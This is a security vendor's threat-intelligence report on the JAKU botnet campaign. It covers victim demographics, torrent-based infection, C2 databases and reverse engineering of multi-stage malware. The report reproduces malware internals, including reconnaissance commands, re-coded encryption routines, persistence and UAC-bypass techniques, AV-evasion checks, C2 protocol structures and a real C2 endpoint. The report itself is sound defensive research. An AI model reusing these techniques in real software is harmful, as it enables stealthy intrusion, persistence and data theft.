EXECUTIVE SUMMARY 

JAKU is the name given to the investigation, surveillance 
and analysis, by the Forcepoint Special Investigations 
team, of an on-going botnet campaign. 

Organised crime has been operating botnets for several 
years and the term itself has been in common parlance for 
over a decade. While JAKU may not answer all the 
questions regarding botnets, it does offer some insight and 
understanding into the inner workings of a botnet. JAKU 
also sheds some light onto the victims of botnets, why 
they are vulnerable, and possibly, why they are targeted. 

What JAKU demonstrates is the re-use of Infrastructure, 
Tools, Techniques and Processes (TTPs), as well as the 
herding of victims into separate groupings; some 
indiscriminate and others highly targeted. Both the herding 
of general botnet victims and highly targeted attacks on 
individuals and organisations is hardly surprising. What is 
somewhat of a step change, however, is the execution of 
a number of concurrent operations within a campaign, 
using almost identical TTPs, to both herd thousands of 
victims into becoming botnet members while at the same 
time executing a targeted operation on a very small 
number of individuals. 

Within the noise of thousands of seemingly 
indiscriminate botnet victims, the JAKU 
campaign performs a separate, highly 
targeted operation. 

Forcepoint Security Labs has identified the 
precision targeting and tracking of a small 
number of individuals of various 
nationalities. These individuals include 
members of International Non-
Governmental Organisations (NGOs), 
Engineering Companies, Academics, 
Scientists and Government Employees. 
North Korea (DPRK) and Pyongyang are 
the common theme shared between these 
individuals. 

Because of the sensitivity of this part of the 
investigation, only the technical details of 
the ‘RED-RACOON’ operation are 
contained within this report and Law 
Enforcement and Government Agencies 
have been informed. 

This paper examines how the JAKU botnets are constructed and identifies their characteristics, and in the 
case of the targeted attacks, how they differ from the scattergun attacks of broader botnet activities. This 
study also highlights the consequences that Internet users who disregard copyrights and digital rights may 
face. Many may incur end-point security vulnerabilities that may not only leave them subject to attack, but 
also may allow their machines to be misused by adversaries, such as the JAKU botnet controllers, to 
execute information and identity theft. 

Botnets are an easy form of resilient, redundant and highly pervasive attack infrastructures that are 
repeatedly deployed by major threat actors, such as organised crime-sponsored attackers and rogue states 
via their agencies.  This resilience is strengthened by what appears to be the herding of victims into smaller 
bot-networks. This, to some degree at least, ensures that if the botnet is compromised then the remainder 
of the campaign is left to operate. 

Finding, tracking and shutting down attack modes and methodologies with such capabilities can be a 
formidable task. No single organisation can do it alone. It requires the close collaboration and intelligence-
sharing activities of both private organisations and government agencies.  

Fortunately, even before the inception of this investigation in October of 2015, Forcepoint customers 
enjoyed protection from the threats presented by the malware discussed in this paper by TRITON® ACE.

OVERVIEW 

The JAKU campaign has clear connections with the TTPs used by the threat actors discussed by 
Kaspersky in the DARKHOTEL investigations from November 2014. This paper recognises the extensive 
contributions by Kaspersky in this area and acknowledges their detailed work. 

What was not in the public domain and has been identified as part of this investigation, are the following: 

Piracy. The prevalence of users/victims who are running counterfeit installations of Microsoft Windows®, 
downloading ‘warez’ software and using BitTorrent software to illegally obtain these as well as other 
copyright protected material, such as movies and music. 

C2 Databases. The use of SQLite files to collate and manage the botnet members, their structure and the 
use of version numbering. 

Poisoned BitTorrents. The technique of threat actors deploying torrent files onto torrent sites that are pre-
infected with malware has not been widely seen before, especially with respect to BitTorrent-types of 
attack. This behaviour is difficult to trace and track and is indiscriminate in its infection pattern unless it has 
some means of targeting desired demographics. 

Resilient C2 Channels.  Stage two of one piece of malware has three inbuilt Command and Control (C2) 
mechanisms.  This level of resilience is not accidental, but rather, such investment and effort is usually 
indicative of the perceived value of the target. 

ACKNOWLEDGEMENTS 

Forcepoint would like to thank our colleagues at the UK National Crime Agency (NCA), CERT-UK, 
KrCERT/CC, Europol and Interpol for their cooperation and assistance in this investigation.  Only with a 
truly interactive approach to collaborative intelligence collection, collation and analysis can we, as an 
industry, ensure that the Internet is a safe place to do business and conduct our personal lives. 
Acknowledgement and thanks to our industry partners and peers who have offered their professional 
insight 

Thanks are due to the following individuals, without their contribution and guidance this document would 
not have been possible: Pierre Boisrond, David Andreas, Josh Douglas, Carl Leonard, Rajiv Motwani,

TECHNICAL ANALYSIS 

Unique Victim Computer. The JAKU servers allocate a unique ID (UID) to every victim. The system tracks 
victims by this UID and records the time that the victim ‘calls home’ to the botnet command and control 
server. Over the period from September 2015 to May 2016, in excess of 29,000 unique victims have been 
recorded by JAKU. However, the prevalence of duplicate entries in the telemetry data (See: SAPHARUS) 
suggests that a more realistic figure is closer to 19,000. 

Victims by Languages. The system locale setting within a Windows computer is used to specify the 
language used when a programme does not understand Unicode characters. In effect, it is the language 
used by the operator of the computer.   

The victims of the JAKU campaign are clearly clustered around the Japanese and Korean languages. 
Korean (43%) and Japanese (30%) make up over 73% of the victim machines, followed by English (13%) 
and Chinese (10%). The remaining 4% of victims are spread across 27 other languages.

Victims by Country. The JAKU campaign covers the majority of countries 
across the world, 134 at the last count. Between September 2015 and May 2016, 
there were an estimated 19,000 unique victims. 

Over 87% of victim computers were in one of four countries: South Korea (42%), 
Japan (31%), China (8%) and the United States (6%). This distribution is 
consistent with the data from the system locale analysis.

Victims per Time-zone.  Each of the victim machines has a time-zone setting for the 
geographic region the system is configured to operate in. The observed distribution of 
time-zone settings for the victim computers reinforces the bias towards Korea and 
Japan which both have time-zone offsets of +09:00 (Korea Standard Time, Tokyo 
Standard Time, and Yakutsk Standard Time) at over 69% of victims. 

The only other major grouping of victims is the +08:00 time-zone (China Standard 
Time, Singapore Standard Time, Taipei Standard Time, West Australia Standard 
Time and North Asia East Standard Time) with 11% of all victims.

Victims by Network Provider.  All IP addresses are controlled within groupings which are sometimes referred 
to as routing domains.  These routing domains are identified by their Autonomous System Numbers (ASN). 
For the JAKU victims, there is a broad spread of victims across 1,555 ASNs.  There is a clear bias on Korean, 
Japanese and Chinese providers:

Corporate Victims. Amongst the JAKU victims, the number of corporate victims is significantly low. The 
proportion of victim computers that are a member of a Microsoft Windows domain rather than workgroups or 
as standalone systems is less than 1% of the total. This is calculated on just 153 unique victims matching the 
corporate criteria. 

Dwell Time. The length of time a botnet victim is infected is referred to as the dwell time. For those identified 
as corporate victims, the mean dwell time is 93 days, with the maximum observed being 348 days.

Victims by Population. If the number of unique victims per country is factored against the population of the 
respective countries, a somewhat different picture emerges. Korea and Japan are still at the top of the target 
list, but Taiwan and Hong Kong rise, while the US and China drop. What is most striking is the clear bias 
toward South Korean victims:

Counterfeit Windows Installations. When an Original Equipment Manufacturer (OEM) installs Microsoft 
Windows onto a new computer, they use what is known as an OEM product ID (PID). These PIDs can be 
identified from retail ones as they contain the text, “OEM“. In cases where Windows reports that the ‘model’ of 
the computer is ‘To be filled by O.E.M.’ and the PID contains OEM, it indicates with some reasonable certainty 
that an OEM product license has been used on non-OEM hardware. In other words, the system is running a 
counterfeit Microsoft Windows license. 

With this in mind, the total number of OEM PIDs identified is 12,243. The number of them that appear to be 
counterfeit is 6,366. For OEM licenses, this indicates that 52% are likely to be counterfeits. It’s reasonable to 
assume that this ratio can be used to infer the prevalence of counterfeits across all the JAKU victims, i.e. 
including those with retail PIDs. 

The likelihood that 52% of computers are actually running counterfeit copies of Microsoft Windows warrants 
further attention. According to the IDC study, “Unlicensed Software and Cybersecurity Threats” (2015)2: “…a 
clear link between unlicensed software and cybersecurity threats... For enterprises, governments, and 
consumers, the obvious implication is that one way to lower cybersecurity risks is to reduce the use of 
unlicensed software.” However, the evidence from JAKU paints a clearer picture: Whereas enterprise and 
like–sized organizations may well be operating correctly with the licensing of software, there are a sizable 
number of other businesses and organizations that are not. 

Within the large number of JAKU victim computers, 75% of Korean machines appear to be running counterfeit 
Windows; for Japan this figure is 25%. Both these percentages are twice the figure stated in the IDC report, 
which states that Korea has a piracy rate of 38% and Japan 12%. Not surprisingly, the country with the largest 
percentage of JAKU victims is China, with 85% of computers being suspected of using counterfeit PIDs. This 
is even worse than the estimated 74% of machines in China suspected of running counterfeit Windows in the 
IDC report. 

Malware Version Numbering. During analysis of the malware and the C2 data sets, a version numbering 
scheme was identified: within the C2 data sets, almost 60 unique version numbers were present. However, for 
the actual malware artefacts found, only seven unique version numbers were found:

Total Number of JAKU Victims. Over time, the total number of victims has been seen to fluctuate, as victims 
come and go. But so, too, do the C2 servers for JAKU. Whole sections of the JAKU victim sets go offline 
because their C2 server has also disappeared. Because the malware used has hard-coded domain names 
and not IP addresses, the C2 servers can come back on-line with a new IP address and catch up on their 
existing victims. Why these servers go offline is not always clear. However, it has certainly been observed on 
at least one occasion that a JAKU server had been compromised by what appeared to be another threat actor 
wishing to use the server for credit card fraud. This situation, however, did not continue for more than a few 
days.

Total Number of JAKU Victims per C2 Server. Far more complex figures appear when the number of 
victims are clustered into their Command and Control (C2) servers and monitored over time. Gaps, such as 
those illustrated by SAPHARUS, are due to infrastructure problems and servers going offline. Others, such as 
the YELLOW-BOA disappearance, are far more complex and are possibly due to servers having a take-down 
notice applied to them by law enforcement.

Stage 1 Behaviour. Check HKCU\CLSID for a default value entry that contains a GUID. This entry is only 
present if the malware has already generated and added it to the registry. On first run, this registry value will 
not be present. If the value already existed, it uses the existing GUID. Otherwise, if HKCU\CLSID does not 
exist, it generates a new, unique GUID using the CoCreateGUID Windows API. This is then saved under 
HKCU\CLSID under the (default) value: 

Windows Update.  As shown in the picture above, the sample also creates two other registry values under 
the CLSID key. The first one, "System", holds the sample's version number; and the second one, 
"WindowsUpdate", contains the current system time. 

Reconnaissance. The sample executes the following commands in order: 

 

date /t 
time /t 
systeminfo 
tasklist 
dir"c:\Program Files\" 
dir"c:\Program Files (x86)\" 
netstat -na 
arp -a 
dir "%s" 
dir "%s" 

Where "%s" is the directory of both the directory of the user's bookmarks (favourites) and then the directory of 
the recently opened documents.

Calling Home. The sample then beacons to its C2 server, including sending the version number, private IP 
address, GUID and also the encoded system information if the previous registry entries did not already exist. If 
the registry entries existed already, then only the sample's version number, the GUID and the private IP 
address are sent. An example of this communication including the system information (&if=) can be seen 
below:

8Ko4aUpfa5Cb3zyEo#dk3#MuaUC3t@sXi2sW= 

The system information is encoded with base64 using the custom alphabet: 

XAY78BCyz012DEFSuvsKLPx9#@TU456ZabcVW3dejkGHIJtwQRlmnopMfghiNOqr 

Awaiting Orders. The sample then checks the response to the above request from the server. If the server 
returns a payload, then the sample will attempt to decrypt and execute it as an executable, and then finish 
(terminate) execution of itself. The format of these payloads that the sample expects is a fake PNG that 
contains an encryption key, as documented in the next section. Upon further analysis, the malware has no 
capability of understanding or executing anything other than this format. If no payload is received, the malware 
will finish (terminate) execution immediately.

MALWARE STAGE 2 – FAKE PNG FILES 

Not only is the C2 telemetry data held in a file that purports to be a JPEG image file, but the 1st stage malware 
itself attempts to download and decrypt the 2nd stage in a file that upon first glance appears to be a graphical 
image. The downloaded file, when examined look like a PNG image file, the headers even conform to the PNG 
file format: 

$ file 96982dd123c0669e3bad92d9d462733f 
96982dd123c0669e3bad92d9d462733f: PNG image data, 997393152 x 167848821, 152-bit 

These 2nd stage files were reverse engineered and were found to contain data generated by modified 
cryptographic and compression algorithms. Subsequently, Forcepoint created a command line utility to decrypt 
and decompress these fake PNG files. 

Encryption Algorithm.  The encryption algorithm used is a modified RC4 implementation. The file analysed 
here was one of the 1st stage info stealers (SHA1: 5d2f372ace971267c28916ae4cb732aa105fc3b9). A 
modified RC4 routine was found at offset: 0x0041903C. Forcepoint re-coded this in C as: 

BOOL rc4(BYTE *buf,int bufsize, BYTE *modkey, int modkeylen)// 0x0041903C 
{ 
  int i, x; 
  byte g = 0; 
  byte j = 0; 
  unsigned char xorIndex; 
  unsigned char tmp; 
  char keydata[257]; 
  char state[257]; 
   
  if (modkey && modkeylen >= 1) 
  { 
      // Zero out the state and keydata 
      memset(state, 0, sizeof(state)); 
      memset(keydata, 0, sizeof(keydata)); 
 
      // Initialize the state array with identity permutation (neutral) 
      for (i = 0; i < 256; i++) 
      { 
          state[i] = i; 
      } 
 
      x = 0; 
 
      // This is an addition included in the malware 
      // it is an attempt to randomize the permutations in the state array with a modulation key array 
      // But there is a mistake where it's only ever writing to state[2] instead of the 
      // presumably intended state[i]. However, this still results in the permutations being modified 
      // enough to change the rc4 cipher 
      for (i = 0; i < 256; i++) 
      { 
          x = x % modkeylen; 
          state[2] = modkey[x++]; 
      } 
 
      // The permutations in the state array are now morphed/randomized 
      for (i = 0; i < 256; i++) 
      { 
          // Morph the permutations using the key data (which is set to all zeros in this instance) 
          g = (keydata[i] + state[i] + g); 
 
          // swap some bytes 
          tmp = state[i]; 
 
          state[i] = state[g]; 
          state[g] = tmp; 
      } 
 
      // process the input data 

 

TLP-WHITE   |   23 

 
 

      for (i = 0, g = 0, j = 0; i < bufsize; i++) 
      { 
          // Adjust indices 
          g = (g + 1); 
          j = (state[g] + j); 
 
          // swap some bytes 
          tmp = state[g]; 
          state[g] = state[j]; 
          state[j] = tmp; 
 
          // obtain xor index in state array 
          xorIndex = (state[j] + state[g]) & 255; 
 
          // perform the xor on the current index of the buffer 
          buf[i] ^= state[xorIndex]; 
      } 
      return TRUE; 
  } 
  return FALSE; 
} 

Bad Crypto. The only significant difference to a standard rc4 routine here is the addition of the “for loop” that 
is (presumably) meant to randomize the permutations in state[2] with the values from the modulation key. 
However, it seems that the author made a mistake: instead of each permutation, only the 3rd value in the array 
is ever modified. Modifying this one byte is still enough to result in a significantly different cipher. Fortunately, 
with this knowledge, it is trivial to crack the RC4 cipher without knowing the key. This is because it is possible 
to brute force the 3rd element of the state array, in the knowledge that it can only have 256 possible values. 

Compression Algorithm. The malware uses the LZ Huffman compression algorithm (lzhuf). Using an open 
source library such as Mike Smiley's LZH implementation allowed us to successfully extract the 2nd stage 
malware from the fake PNGs being decrypted.

MALWARE STAGE 2 – R2D3 
 
R2D3 is a second stage (fake PNG) malware that employs stealth tactics and AV avoidance. Its primary 
purpose appears to be to await an encrypted third stage component to execute. 

Stealth Injection. This second stage malware injects shellcode into a new explorer.exe process every time it 
wishes to do something significant, such as network traffic, registry, and file execution operations. This is a 
stealth tactic to bypass firewalls and AV by creating a new explorer.exe process and injecting shellcode into 
the entry point and then terminating the explorer.exe process in the shellcode immediately afterwards. 

AV Engine Detection. The malware checks whether Bitdefender is installed by checking for the mutex 
"BDAgent-oneinstance-mutex" via the CreateMutexA API. It then checks if AVG is installed by looking for an 
event named "AVG{53036606-6F17-41a9-80DD-AB930D6BA4DD}" via the CreateEventA API. If either of 
these exists, the malware will terminate execution. 

Service Installation. So long as AVG and Bitdefender are not detected, the malware will copy itself to 
%COMMONPROGRAMFILES%\CompSvc.exe. It also creates the file 
%COMMONPROGRAMFILES%\SvcStart.exe, which is embedded within the malware. It then injects shellcode 
into a new explorer.exe in order to execute SvcStart.exe with the following command line: 

SvcStart.exe R2D2 C:\Documents and Settings\user\Local Settings\Temp\filename.ext 

Where "C:\Documents and Settings\user\Local Settings\Temp\filename.ext" is the location of the original 
malware file. 

Analysis indicates that there are two command line prefixes: 

R2D2: Terminates the currently running malware, deletes it from hard-disk and then executes the newly 
copied version in the common program files directory. 

R2D3: Does not require a directory to be given in the command line string and results in SvcStart.exe dropping 
a batch file named exp.bat in the %TEMP% directory, which simply cleans up all of the malware as below: 

:REPEAT 
DEL %1 
IF EXIST %1 GOTO REPEAT 
DEL %2 

 

 

 

 

TLP-WHITE   |   25 

 
 
The R2D2 command line is the only one seen used during live analysis, whereas R2D3 appears to be a clean-
up function.  When the R2D2 command line is used, SvcStart.exe executes the newly created CompSvc.exe, 
which will check if it is running from the common program files directory. If this is the case, it will inject 
shellcode into a new explorer.exe in order to install a persistence key via the Microsoft Active Setup registry 
key location with a custom GUID:

Winpcap.  After the shellcode is injected, the malware will load the winpcap npf.sys driver if it exists. It then 
begins to monitor all network adapters in order to determine which interface is the primary adapter that can 
access the internet. Then, it makes a POST request to the C2 server with gzip compressed system 
information: 

POST http://101.99.68.5/bbs/CaC.php HTTP/1.1  
Content-Type: multipart/form -data; boundary=--HC-MPFD-BOUNDARY 
Content-Length: 320

----HC-MPFD-BOUNDARY-- 

The "id" value "AAwp2ySc" is a base64 encoded version of the MAC address's hexadecimal values for the 
adapter that is determined to be the primary one, which in this instance was “00 0c 29 db 24 9c”. The gzip 
compressed data, in plaintext looks like this example: 

CNAME: MICROSOFT 
OSVER: 513112 
IP: -2132891456 
DNAME: None 

Next, the malware injects shellcode into explorer.exe to contact its C2 with a GET request, which seems to 
expect another encrypted malware to be returned. The following shows parts of the shellcode (dumped from 
Ollydbg), which shows this C2 server communication. The comments indicate what the values of certain 
registers and addresses are in real time. Again, the MAC address identifier can be seen in the following 
network traffic shellcode:

The code continues on to delete a Zone.Identifier ADS for msvcrt.dll (msvcrt.dll:Zone.Identifier). The purpose 
of this part of the code is unclear, because msvcrt.dll does not seem to be overwritten by the malware and 
should not contain a Zone.Identifier record that prevents its usage in any way. 

Malware Configuration.  The malware also contains a configuration of sorts. Some of the parts include: 

S[32]:inner_UniqID=4C2830A17D224f20ADA23901BD61DDE4 
B:inner_Escl=1 
S[260]Exe Location=C:\Program Files\Common Files\Services\CompSvc.exe 

Each field is preceded by the length and type of the value associated with it. For example: S[32] means that 
the value contains a string of 32 characters. 

  The inner_UniqID value seems to be a static value, probably used as a campaign identifier. 

  The inner_Escl value is a Boolean, indicating whether escalated permissions are available.  If not, then 

the malware drops a DLL payload into the Windows sysprep folder under the name cryptbase.dll. It 
then launches sysprep.exe, which will run with administrative permissions and load up cryptbase.dll 
from the current folder rather than the system folder. This technique is a commonly used means of 
bypassing Windows User Account Control (UAC). 

  The Exe Location value is the current location of the malware.

MALWARE STAGE 2 – C3PRO-RACCOON 

C3PRO-RACCOON is another one of the second stage components (fake PNG) that is hosted on a C2 server 
with the small amount of targeted victims. This C2 data set is suspected of being a targeted set of victims and 
is referred to within the JAKU analysis as RACCOON. 

The C3PRO- RACCOON malware initially communicates with a specific C2 server over DNS. Kaspersky have 
already blogged about this same malware family when it was hosted on the KCNA North Korean news site in 
early 2015: 

SHA1: c28bdea5e823cbca16d22a318ff29a338fcf0379 
C3PRO-RACCOON Behaviour. This malware sample is another self-extractor, which drops the usual start.bat 
and end.bat files along with the Trojan component and a utility to add a new Windows task: 

start.bat 
end.bat 
drmanidd32.dll (C3PRO-RACCOON trojan) 
SetTaskPathDl.exe (C# utility to add a new Windows task) 
Microsoft.Win32.TaskScheduler.dll (legitimate file used by SetTaskPathDl.exe for task scheduler stuff) 

The file start.bat is executed which results in SetTaskPathDl.exe being invoked with the following arguments: 

%temp%\SetTaskPathDl.exe drmanidd32.dll Adobe Update SecuUpdates.dll 

This results in drmanidd32.dll being moved to %appdata%\Adobe\Update\SecuUpdates.dll and a Windows 
task created to execute the following command upon user logon: 

C:\WINDOWS\system32\rundll32.exe %appdata%\Adobe\Update\SecuUpdates.dll,start now 

Once executed, SecuUpdates.dll generates DNS traffic, which is the C2 channel communication: 

The malware resolves a specific C2 DNS name and uses the returned IP as a DNS server for resolving the 
CNAME of pWrpqMoqqipJiiwGBgaoxueIyMaG56g.e.q, which results in a resolution of LS4.com at IP 
231.157.250.149. 

The pWrpqMoqqipJiiwGBgaoxueIyMaG56g string is a base64 encoded, encrypted version of 
"+MICROSOFT_000C29DB249C" which is a '+' followed by the current computer name, "_" and then the MAC 
address of the primary network adapter.

Here is the encryption routine in assembly: 
loop: 

    mov     al, buffer[ecx]    ; buffer contains string to encrypt (i.e. "+MICROSOFT_000C29DB249C") 

    add     al, 3              ; Add a value of 3 to the current 8-bit char value 

    movzx   eax, al            ; Clear eax, replace with lower 8-bit val (this is pointless, poor coding) 

    xor     eax, 3             ; XOR 32-bit value of eax (which is just 8-bit al, effectively) by 3 

    mov     edx, eax           ; Save eax in edx 

    shr     edx, 3             ; Shift edx right by 3 bits 

    shl     al, 5              ; Shift 8-bit eax value left by 5 bits 

    or      dl, al             ; OR 8-bit edx against 8-bit eax 

    mov     buffer[ecx], dl    ; Copy new value (stored in dl) into current index of buffer 

    inc     ecx                ; Increase buffer index 

    cmp     ecx, edi           ; Check if we're done yet 

    jl      short loop 

This routine is poorly coded, as 32-bit values are not required. Alternatively, the author introduced an error in 
the left shift. Regardless, once corrected and optimised, the routine look like this: 

loop: 

    mov     al, buffer[ecx]    ; buffer contains string to encrypt (i.e. "+MICROSOFT_000C29DB249C") 

    add     al, 3              ; Add a value of 3 to the current char value 

    xor     al, 3              ; XOR char value by 3

Or the same, more complete routine in C:

{ 

    for (int i = 0; i < strlen(buffer); i++) 

    { 

        unsigned char a = buffer[i]; 

        unsigned char b; 

   

        a += 3; 

        a ^= 3; 

   

        b = a; 

   

        b >>= 3; 

        a <<= 5; 

   

        b |= a; 

   

        buffer[i] = b; 

    }

DNS Command Channel. The DNS requests containing the encrypted system name and MAC address 
happen regularly (~2 minutes), with the IP of LS4.com changing each time. The malware translates LS4.com 
into LS4=, base64 decodes it and then decrypts it using the reverse of the algorithm above. The result of this 
is the string "go", and the malware also understands the following commands:

A "parameter" here is a part of the CNAME separated by a ".". For example, "LS4.test.com" would be the

The "secondary" C2 module receives commands over TCP and a custom protocol. The data structures are 
defined below: 

// This is the client hello packet structure (actually not really a structure, just a 4 byte value) 

typedef struct clienthello_s 

{ 

    uint32 client_magic; // Must be 0xDF1B697A

    byte _align; // Unused, just here for alignment 

} keyheader_t;  

   

// This is the full structure for anything received from the server 

typedef struct servercmd_s 

{ 

    uint32      server_magic;   // Must be 0xA37CE092

} servercmd_t; 

   

// This is used by the file upload & download routines 

typedef struct filetransfer_s 

{ 

    long        filesize;       // Size of file (encrypted) 

    byte        filedata[];     // File contents (encrypted)        

} filetransfer_t; 

The "UDT" C2 module receives commands over UDP and the UDT library protocol. The data structures used 
by the malware are similar to the ones above, but without magic values or encryption keys. Instead, the 
encryption keys are static. The UDT C2 module only supports a subset of the commands that the secondary 
C2 module does. 

The command set supported by the secondary and UDT C2 modules is the same as in Kaspersky’s analysis 
of the KCNA malware. However, our analysis of the KCNA malware and C3PRO-RACCOON revealed some 
additional functionality and small differences in what Kaspersky reported. 

The full list of commands used by the secondary and UDT modules can be seen in the table below:

OBSERVATIONS ON C3PRO-RACCOON 

The ability for malware to concurrently support three separate, custom built C2 channels is more advanced 
than the majority of malware currently observed in the global threat landscape. This offers insight into the 
amount of effort the malware author and actor(s) have expended to ensure that the malware is stealthy and 
can remain in contact with its C2s, despite the network environment it may be running within. 

UDT Library. The malware uses an open source library called UDT3 for one of its C2 channels. UDT provides 
much of the benefits of TCP but retains higher data transfer speeds over UDP. The authors likely chose the 
library in order to provide the flexibility of being able to securely use UDP for C2 communication, as well as 
being stealthy at the same time. 

Secure Delete. The file deletion routine has been taken from publicly available secure erasure code. This 
code was originally written by John Underhill and called “Secure File Shredder”4. The routine used in the 
malware even contains the same mistake as John Underhill made, where he renames the file 780 times (30 * 
26) instead of the intended 30. The only difference is that the file truncation is only performed once in the 
malware, rather than 10 times, as in Underhill's code. The purpose of this code is to prevent advanced 
forensics techniques from being able to recover the deleted files. 

Unfinished Code. The 'du' and 'dlu' commands are interesting because they only support unloading a module 
from the current process, but by creating a remote thread in a new explorer.exe. This makes little sense 
because it would be a lot simpler and more effective to just unload the module in the current process. This is 
likely to be an unfinished or abandoned routine that is currently not used by the actor. The older version of this 
malware that Kaspersky analysed did not have any implementation for 'dlu', and the 'dll' routine did not create 
a new thread in an explorer.exe process to do this work, but instead did it from its own process. 

Spoofed File Dates. When a file is sent to the infected machine via the "_put" command and written to disk, 
the file access times are modified to be the same as gdi32.dll's from the system directory. This makes the file 
less suspicious and can also prevent some forensic time-lining. 

Under Development.  The older version of this malware that Kaspersky analysed was compiled using 
Microsoft Visual Studio 6.0, whereas this version has been compiled with Microsoft Visual Studio 10.0. The 
malware is clearly being actively developed and the developers' environment(s) are being improved.

WHO IS SAPHARUS? 

SAPHARUS-PC is the name of a Windows computer which appears over 1,800 times in one of the JAKU 
Datasets (referred to as the SAPHARUS data set for this reason). From a research point of view, this 
significant anomaly clearly needed investigation. 

SAPHARUS Timeline. The number of entries is the database is constantly changing. While the total number 
of entries appears to grow, due to more victims being infected, the number of SAPHARUS entries is 
decreasing:

The Real SAPHARUS. Within the dataset there appear one is 'real' SAPHARUS-PC (UID: D1336E59-0FB3-
473B-8A43-F667E7052CF5) with a public IP address of 91.44.233.77. This is expected to be a 'real' host 
because of the system information is complete and is not duplicated elsewhere. Whereas, the SAPHARUS-PC 
duplicates all have identical system information.  

Hypothesis #1 - Overwrites. Real entries were overwritten in error with the SAPHARUS data. A number of 
facts support this hypotheses: the fake SAPAHRUS data is clearly corrupted and is missing the task list and 
recent files, part of which could have resulted in some sort of parsing error or when dumping it in the DB. The 
ASN's and IP's of these entries seem to indicate that they are real victims. However, it is impossible to prove 
that it wasn't done intentionally. (Likelihood: High) 

Hypothesis #2 - Additions. SAPHARUS entries were added either due to an error or intentionally. This 
seems less likely as SAPHARUS-PC entries reuse some of the IPs already in the database. Furthermore, 
adding SAPHARUS entries intentionally would serve very little purpose. 

There is evidence that at least one SAPHARUS-PC is bogus: 

SAPHARUS at Forcepoint. One of the hosts with the name SAPHARUS-PC has an external IP address 
recorded in the dataset, which is in reality an IP address owned and operated by Forcepoint. During the 
analysis of JAKU, the Forcepoint Special Investigation team operated a honeypot machine which had an 
external IP address identical to the SAPHARUS-PC public IP address. 

Diversity of Addresses. The SAPHARUS-PC external IP addresses are from a large and diverse number of 
ASNs. These IP addresses and ASNs appear to correlate with the ASNs of other victims. 

Truncated System Information.  SAPHARUS-PC entries have truncated system information (INFO); i.e. no 
task list and no recent files. 

It is believed that the SAPHARUS-PC entries are duplicated information from other victim data. Why this is the 
case is unclear. Possibilities include programming errors in the C2 software (possible), or the use of 
SAPHARUS-PC as a 'flag' while administering the C2 data sets (unlikely). 

For analysis purposes, the SAPHARUS-PC entries were not included in detailed analysis such as correlation 
of victims within and across C2 servers.

PARTING THOUGHTS FOR THE READER 

AN EXERCISE TO THE READER 

During the JAKU investigation, a great deal of data was collected, collated and analysed. Some of the data 
throws greater insight on the JAKU campaign, while much of it, sadly, does not. Occasionally, when ‘pivoting’ 
off already collected data, strange and unusual things are found; for example, learning that Shokushu is 
Japanese for tentacle. 

Unfortunately, time is sometimes not available to allow for the “so what?” questions to be answered fully. One 
example is the following script which was found at the URL: hxxp://bestshop.minidns.net/test/ccdown/ping.bat. 
Although dating back to November 2014, it is still noteworthy because of a number of curiosity reasons. One 
example is: “Why ‘ping’ after doing the ‘traceroute’?” 

The remaining reasons are left as an exercise to the reader.  However, this is not the Easter-egg you are 
looking for: 

tracert fs.star.kp >> %tmp%\temp98746.tmp 

ping fs.star.kp >> %tmp%\temp98746.tmp 

tracert 172.16.1.18 >> %tmp%\temp98746.tmp 

ping 172.16.0.38 >> %tmp%\temp98746.tmp 

ping 172.16.0.37 >> %tmp%\temp98746.tmp 

ping 172.16.4.1 >> %tmp%\temp98746.tmp 

ping 10.10.1.1 >> %tmp%\temp98746.tmp 

ping 1.0.128.2 >> %tmp%\temp98746.tmp 

WHY JAKU? 

“The most merciful thing in the world, I think, is the inability of the human mind to correlate all its contents.” 

(Lovecraft, The Call of Cthulhu, 1926) 

During the course of our investigation we have been often asked “Why JAKU?” 

Initially, it was a misspelt reference to the desert planet in the Star Wars movie The Force Awakens.  This was 
because we had discovered a number of Star Wars references made by the threat actors within their malware.  
This included R2D2.  Because we had no wish to face any copyright issues, we spelt it as JAKU. 

However, as we embarked on our investigation we found out more about JAKU.  We realised that this thing 
had reached every corner of the world.  As we continued, it began to emerge that this beast had a centre of 
gravity somewhere in the Gulf of Thailand and a predilection for attacking Japan and South Korea. 

As an unashamed fan Japanese monster movies, anime, manga and DJ Krush, and with more than a passing 
interest in Lovecraft’s Cthulhu mythos, it was clear (to me at least) that JAKU should be represented as a 
tentacle wielding sea monster rising from ocean to grab its next set of victims.  This fitted well with our 
observation of the noticeable amount of pirated anime movies on the victim machines, downloaded from sites 
‘baited’ with malware to catch the next unsuspecting victims.
